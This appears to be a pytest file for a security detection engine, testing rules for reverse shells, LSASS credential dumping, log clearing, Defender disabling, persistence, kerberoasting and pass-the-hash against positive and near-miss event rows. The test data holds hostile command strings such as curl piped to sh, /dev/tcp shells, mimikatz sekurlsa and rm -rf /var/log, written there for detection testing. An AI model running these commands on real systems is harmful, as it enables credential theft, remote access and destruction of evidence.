"""Detection batches B1-B4 (DEVELOPMENT.md §15.8): positive + near-miss per new/extended rule, using BB-detect's
field values. Match rules assert the EXACT set of match rules that fire on a row; templates pin SPEC2_TH."""

from __future__ import annotations

from pathlib import Path

import pytest

from attacklens import detect, detect_sql
from attacklens.schemas import CANONICAL_COLUMNS

from .conftest import make_events_parquet, query
from .test_detect import DAY, MIN, T0, ev, labels, proc, rule_of, run_stage2, th_of  # noqa: F401 (ev = fixture)
from attacklens import detect_templates as T

SPEC2_TH = {"sudo_max_pair_seen": 2, "kerberoast_min_services": 5, "kerberoast_window_ms": 600_000,
            "kerberoast_encryption": ["0x17"], "pth_max_pair_seen": 2, "pth_logon_types": [9],
            "pth_auth_packages": ["negotiate", "ntlm"]}
NEW_COLUMNS = ("auth_package", "ticket_encryption", "service_name")
RUN = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"


def lx(ts: int, name: str, cmd: str, parent: str = "bash", host: str = "srv-web-01", user: str = "vreddy") -> dict:
    return {**proc(ts, name, cmd, parent, host=host), "src_user": user}


# ================================================================ match rules (B1-B4 + extensions)
MATCH_CASES2 = [
    # encoded_powershell (extended)
    ("ps nop hidden", proc(T0, "powershell.exe", "powershell.exe -nop -w hidden -c x"), {"encoded_powershell"}),
    ("ps nop hidden upper", proc(T0, "POWERSHELL.EXE", "POWERSHELL.EXE -NOP -W HIDDEN -C x"),
     {"encoded_powershell"}),
    ("ps iex downloadstring", proc(T0, "powershell.exe",
                                   "powershell -c iex (New-Object Net.WebClient).DownloadString(u)"),
     {"encoded_powershell"}),
    ("ps nop benign", proc(T0, "powershell.exe", "powershell.exe -nop Get-Date"), set()),
    ("ps hidden under word", proc(T0, "powershell.exe", "powershell.exe -nop -w hidden -c x", "winword.exe"),
     {"office_spawns_script"}),  # Office parent belongs to office_spawns_script only
    # scheduled_task (extended)
    ("schtasks create", proc(T0, "schtasks.exe", r"schtasks /create /tn upd /tr C:\x.exe /sc onlogon"),
     {"scheduled_task"}),
    ("schtasks create upper", proc(T0, "schtasks.exe", r"SCHTASKS.EXE /Create /TN upd /TR C:\x.exe"),
     {"scheduled_task"}),
    ("schtasks query", proc(T0, "schtasks.exe", "schtasks /query"), set()),
    # service_or_task (extended)
    ("sc create", proc(T0, "sc.exe", r"sc create upd binPath= C:\x.exe"), {"service_or_task"}),
    ("sc.exe create", proc(T0, "sc.exe", r"C:\Windows\System32\sc.exe create upd binPath= C:\x.exe"),
     {"service_or_task"}),
    ("sc query", proc(T0, "sc.exe", "sc query"), set()),
    # run_key_persistence (extended)
    ("reg add run", proc(T0, "reg.exe", rf"reg add {RUN} /v x /d C:\x.exe", "cmd.exe"), {"run_key_persistence"}),
    ("reg query run", proc(T0, "reg.exe", rf"reg query {RUN}", "cmd.exe"), set()),
    # log_cleared (extended)
    ("wevtutil cl", proc(T0, "wevtutil.exe", "wevtutil cl Security"), {"log_cleared"}),
    ("wevtutil qe", proc(T0, "wevtutil.exe", "wevtutil qe Security"), set()),
    # suspicious_cmd (T1059.003)
    ("cmd under mshta", proc(T0, "cmd.exe", "cmd.exe /c dir", "mshta.exe"), {"suspicious_cmd"}),
    ("cmd under w3wp", proc(T0, "cmd.exe", "cmd.exe /c dir", "w3wp.exe"), {"suspicious_cmd"}),
    ("cmd under winword", proc(T0, "cmd.exe", "cmd.exe /c dir", "winword.exe"),
     {"suspicious_cmd", "office_spawns_script"}),
    ("cmd under excel", proc(T0, "cmd.exe", "cmd.exe /c dir", "EXCEL.EXE"), {"suspicious_cmd", "office_spawns_script"}),
    ("cmd under explorer", proc(T0, "cmd.exe", "cmd.exe /c dir", "explorer.exe"), set()),
    # wmi_exec (T1047)
    ("ps under wmiprvse", proc(T0, "powershell.exe", "powershell.exe Get-Process", "wmiprvse.exe"), {"wmi_exec"}),
    ("cmd under wmiprvse", proc(T0, "cmd.exe", "cmd.exe /c dir", "wmiprvse.exe"), {"wmi_exec", "suspicious_cmd"}),
    ("wmic process call create", proc(T0, "wmic.exe", 'wmic /node:srv-file-01 process call create "cmd.exe /c x"'),
     {"wmi_exec"}),
    ("wmic os", proc(T0, "wmic.exe", "wmic os get caption"), set()),
    # unix_reverse_shell (T1059.004)
    ("bash -i", lx(T0, "bash", "bash -i"), {"unix_reverse_shell"}),
    ("dev tcp", lx(T0, "bash", "exec 5<>/dev/tcp/203.0.113.9/80"), {"unix_reverse_shell"}),
    ("curl pipe sh", lx(T0, "curl", "curl -s http://x/a | sh"), {"unix_reverse_shell"}),
    ("wget pipe bash", lx(T0, "wget", "wget -qO- http://x/a | bash"), {"unix_reverse_shell"}),
    ("curl to file", lx(T0, "curl", "curl -o a http://x/a"), set()),
    ("bash script", lx(T0, "bash", "bash script.sh"), set()),
    # indicator_removal_files (T1070.004)
    ("rm var log", lx(T0, "rm", "rm -rf /var/log"), {"indicator_removal_files"}),
    ("del f q", proc(T0, "cmd.exe", r"cmd.exe /c del /f /q C:\Windows\Temp\*.log"), {"indicator_removal_files"}),
    ("rm tmp build", lx(T0, "rm", "rm -rf /tmp/build"), set()),
    # disable_security_tools (T1562.001)
    ("mp disable", proc(T0, "powershell.exe", "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"),
     {"disable_security_tools"}),
    ("mp benign", proc(T0, "powershell.exe", "powershell.exe Set-MpPreference -SignatureUpdateInterval 4"), set()),
    # lsass_dump (T1003.001)
    ("mimikatz", proc(T0, "mimikatz.exe", 'mimikatz.exe "privilege::debug" exit'), {"lsass_dump"}),
    ("sekurlsa", proc(T0, "x.exe", "x.exe sekurlsa::logonpasswords"), {"lsass_dump"}),
    ("procdump lsass", proc(T0, "procdump64.exe", "procdump64.exe -ma lsass.exe out.dmp"), {"lsass_dump"}),
    ("comsvcs minidump", proc(T0, "rundll32.exe",
                              r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\temp\l.dmp full"),
     {"lsass_dump"}),
    ("procdump w3wp", proc(T0, "procdump64.exe", "procdump64.exe -ma w3wp.exe out.dmp"), set()),
    # action gate: the same command lines on a non-proc_start row never fire
    ("not proc_start", {**proc(T0, "mimikatz.exe", "mimikatz.exe sekurlsa::logonpasswords"), "action": "other"},
     set()),
    ("ts_ok false", {**proc(T0, "bash", "bash -i"), "ts_ok": False}, set()),
]


@pytest.fixture(scope="module")
def fired_by_case(tmp_path_factory: pytest.TempPathFactory) -> dict[str, set[str]]:
    """Match rules are row-local, so every case goes into ONE events set (distinct source_seq per case); each rule's
    real rule_sql() is run once and its hits are attributed back to the case by source_seq."""
    assert len({c[0] for c in MATCH_CASES2}) == len(MATCH_CASES2), "case names must be unique"
    rows = [{**row, "source_seq": 1000 + k} for k, (_, row, _) in enumerate(MATCH_CASES2)]
    ctx = make_events_parquet(tmp_path_factory.mktemp("m2"), rows)
    try:
        detect_sql.prepare(ctx.con, ctx.cfg)
        rules, th = detect.rules_and_thresholds(ctx.cfg)
        detect.build_match_hits(ctx.con, rules, ctx.cfg["ioc"], th)
        out: dict[str, set[str]] = {c[0]: set() for c in MATCH_CASES2}
        for r in rules:
            if r["kind"] != "match":
                continue
            seqs = [x[0] for x in ctx.con.execute(f"SELECT source_seq FROM ({detect.rule_sql(ctx.con, r, th)})")
                    .fetchall()]
            assert len(seqs) == len(set(seqs)), (r["id"], seqs)  # one alert per matching row
            for q in seqs:
                out[MATCH_CASES2[int(q) - 1000][0]].add(r["id"])
    finally:
        ctx.con.close()
    return out


@pytest.mark.parametrize("desc,row,expected", MATCH_CASES2, ids=[c[0] for c in MATCH_CASES2])
def test_b_match_rule_fires_only_on_signal(fired_by_case, desc: str, row: dict, expected: set[str]) -> None:
    assert fired_by_case[desc] == expected


def test_b_match_labels(ev) -> None:
    want = {"suspicious_cmd": ("T1059", "T1059.003", "Execution"), "wmi_exec": ("T1047", None, "Execution"),
            "unix_reverse_shell": ("T1059", "T1059.004", "Execution"),
            "indicator_removal_files": ("T1070", "T1070.004", "Defense Impairment"),
            "disable_security_tools": ("T1562", "T1562.001", "Defense Impairment"),
            "lsass_dump": ("T1003", "T1003.001", "Credential Access")}
    ctx = ev([proc(T0, "x", "x")])
    rules, th = detect.rules_and_thresholds(ctx.cfg)
    for rid, (tech, sub, tactic) in want.items():
        r = rule_of(ctx.cfg, rid)
        assert (r["technique"], r.get("sub_technique"), r["tactic"]) == (tech, sub, tactic), rid


# ================================================================ templates
def run_t(ctx, rule_id: str, **over) -> list[dict]:
    rule = rule_of(ctx.cfg, rule_id)
    sql = T.TEMPLATES[rule["template"]](ctx.con, rule, th_of(ctx.cfg, **{**SPEC2_TH, **over}))
    cur = ctx.con.execute(sql + " ORDER BY ts_ms")
    cols = [d[0] for d in cur.description]
    return [dict(zip(cols, r)) for r in cur.fetchall()]


# ---- sudo_escalation (T1548.003)
def sudo(n: int, user: str = "vreddy", name: str = "sudo") -> list[dict]:
    return [lx(T0 + i * DAY, name, "sudo -i", user=user) for i in range(n)]


def test_sudo_rare_pair_fires(ev) -> None:
    rows = run_t(ev(sudo(2)), "sudo_escalation")
    assert labels(rows) == [("T1548", "T1548.003", "Privilege Escalation")] * 2
    assert [(r["ts_ms"], r["host"], r["src_user"]) for r in rows] == [(T0, "srv-web-01", "vreddy"),
                                                                      (T0 + DAY, "srv-web-01", "vreddy")]


def test_sudo_routine_pair_silent(ev) -> None:
    assert run_t(ev(sudo(3)), "sudo_escalation") == []


def test_sudo_other_process_silent(ev) -> None:
    assert run_t(ev(sudo(1, name="bash")), "sudo_escalation") == []


def test_sudo_pairs_counted_per_user(ev) -> None:
    rows = run_t(ev(sudo(3, user="admin1") + sudo(1, user="vreddy")), "sudo_escalation")
    assert [r["src_user"] for r in rows] == ["vreddy"]


# ---- kerberoasting (T1558.003)
def tgs(n: int, spacing: int = MIN, enc: str = "0x17", user: str = "jdoe", distinct: bool = True) -> list[dict]:
    return [{"ts_ms": T0 + i * spacing, "action": "kerberos_tgs", "event_id": 4769, "host": "srv-dc-01",
             "src_user": user, "src_ip": "10.10.3.15", "ticket_encryption": enc,
             "service_name": f"MSSQLSvc/db{i if distinct else 0}.corp.local"} for i in range(n)]


def test_kerberoast_5_services_fires(ev) -> None:
    rows = run_t(ev(tgs(5)), "kerberoasting")
    assert labels(rows) == [("T1558", "T1558.003", "Credential Access")]
    r = rows[0]
    assert (r["ts_ms"], r["last_ts_ms"], r["raw_alert_count"], r["src_user"], r["host"], r["src_ip"]) == (
        T0, T0 + 4 * MIN, 5, "jdoe", "srv-dc-01", "10.10.3.15")


def test_kerberoast_encryption_case_insensitive(ev) -> None:
    assert len(run_t(ev(tgs(5, enc="0X17")), "kerberoasting")) == 1


@pytest.mark.parametrize("case", ["4_services", "aes_0x12", "spread_12_min", "same_service_5x"])
def test_kerberoast_near_misses(ev, case: str) -> None:
    rows = {"4_services": tgs(4), "aes_0x12": tgs(5, enc="0x12"), "spread_12_min": tgs(5, spacing=3 * MIN),
            "same_service_5x": tgs(5, distinct=False)}[case]
    assert run_t(ev(rows), "kerberoasting") == []


# ---- pass_the_hash (T1550.002)
def pth(n: int = 1, pkg: str = "Negotiate", ltype: int = 9, user: str = "svc_sql", **kw) -> list[dict]:
    return [{"ts_ms": T0 + i * DAY, "action": "login_success", "event_id": 4624, "host": "srv-file-01",
             "target_user": user, "src_ip": "10.10.4.13", "logon_type": ltype, "auth_package": pkg,
             "logon_id": f"0x7{i}", **kw} for i in range(n)]


@pytest.mark.parametrize("pkg", ["Negotiate", "NTLM", "ntlm"])
def test_pth_fires(ev, pkg: str) -> None:
    rows = run_t(ev(pth(pkg=pkg)), "pass_the_hash")
    assert labels(rows) == [("T1550", "T1550.002", "Lateral Movement")]
    assert (rows[0]["host"], rows[0]["target_user"], rows[0]["src_ip"]) == ("srv-file-01", "svc_sql", "10.10.4.13")


@pytest.mark.parametrize("case", ["kerberos", "type_3", "pair_3x", "machine_name", "is_machine"])
def test_pth_near_misses(ev, case: str) -> None:
    rows = {"kerberos": pth(pkg="Kerberos"), "type_3": pth(ltype=3), "pair_3x": pth(3),
            "machine_name": pth(user="ws-sales-013$"), "is_machine": pth(is_machine=True)}[case]
    assert run_t(ev(rows), "pass_the_hash") == []


def test_pth_two_logons_on_pair_both_fire(ev) -> None:
    assert len(run_t(ev(pth(2)), "pass_the_hash")) == 2


# ================================================================ old Parquet without the 3 new columns
def test_old_parquet_without_new_columns_runs_every_rule(tmp_path: Path) -> None:
    rows = [proc(T0, "mimikatz.exe", "mimikatz.exe sekurlsa::logonpasswords"),
            lx(T0 + MIN, "sudo", "sudo -i")]
    ctx = make_events_parquet(tmp_path, rows)
    try:
        for f in (ctx.parquet_dir / "events").rglob("*.parquet"):  # rewrite as pre-W5 Parquet
            tmp = f.with_name("old.parquet")
            ctx.con.execute(f"COPY (SELECT * EXCLUDE ({', '.join(NEW_COLUMNS)}) FROM read_parquet('{f.as_posix()}')) "
                            f"TO '{tmp.as_posix()}' (FORMAT PARQUET)")
            f.unlink()
        from attacklens import db
        db.register_events(ctx.con, ctx.events_glob)
        have = {r["column_name"] for r in query(ctx, "DESCRIBE events")}
        assert not set(NEW_COLUMNS) & have
        assert sorted(detect_sql.fill_missing_columns(ctx.con, ctx.events_glob)) == sorted(NEW_COLUMNS)
        types = {r["column_name"]: r["column_type"] for r in query(ctx, "DESCRIBE events")}
        assert all(types[c] == CANONICAL_COLUMNS[c] for c in NEW_COLUMNS)
        alerts = run_stage2(ctx)  # detect.run: every rule, including the three templates reading new columns
    finally:
        ctx.con.close()
    assert {a["rule_id"] for a in alerts} == {"lsass_dump", "sudo_escalation"}
